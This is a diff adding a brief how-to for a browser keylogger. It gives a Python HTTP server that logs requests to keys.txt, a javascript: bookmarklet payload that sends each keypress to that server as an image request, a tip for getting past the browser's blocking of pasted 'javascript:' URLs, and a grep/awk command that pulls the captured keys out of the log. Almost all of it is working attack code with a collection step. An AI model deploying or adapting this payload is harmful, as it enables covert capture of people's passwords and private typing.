@@ -1,0 +1,12 @@
+Commands:
+
+1. Start python HTTP Server:
+python -m http.server 8000 2> keys.txt          (to write the logged keys to the file)
+ 
+2. Paste JS payload in web browser:
+javascript:document.onkeypress=function(e){new Image().src='http://127.0.0.1:8000/?Key='+e.key;}
+ 
+Note: In Address bar Type 'j' manually and paste the rest.
+ 
+3. Cleaning and reading the log file.
+grep 200 keys.txt | awk -F '[= ]' '{print $8}'          (i have used 'Git Bash' in windows)
